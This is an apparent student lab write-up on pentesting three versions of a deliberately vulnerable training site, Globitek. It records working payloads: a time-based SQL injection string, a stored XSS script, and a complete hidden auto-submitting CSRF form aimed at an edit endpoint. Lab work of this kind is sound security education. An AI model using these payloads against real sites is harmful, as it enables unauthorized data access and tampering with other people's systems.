# Project 8 - Pentesting Live Targets

Time spent: 2 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection

Running the following command in the placement of id will make the page hang for 5 seconds.
```
' OR SLEEP(5)=0--'
```

Vulnerability #2: Session Hijacking

When already logged in, by accessing the hacktools, then copying the session, I can log in through a different browser using the same session.

## Green

Vulnerability #1: User Enumeration

When testing on the green website, only usernames that are valid in the database become bold when a username fails to login.

Vulnerability #2: XSS

When submitting a xss in the feedback tab, once the admin logs in and checks the feedback, it'll activate the XSS.

```
<script>alert('Test XSS');</script>
```

## Red

Vulnerability #1: IDOR

Vulnerability #2: CSRF

Opening the the HTML File with the following code will modify a value on the red website.

```
<html>
  <body onload="document.edit_salesperson.submit()">
    <form action="https://35.224.37.42/red/public/staff/salespeople/edit.php?id=1" method="POST" name="edit_salesperson" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="Totally"><br>
      <input type="text" name="last_name" value="Not Suspicious"><br>
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```

## Notes
The assignments were fun because we had a chance to test it on real world websites.
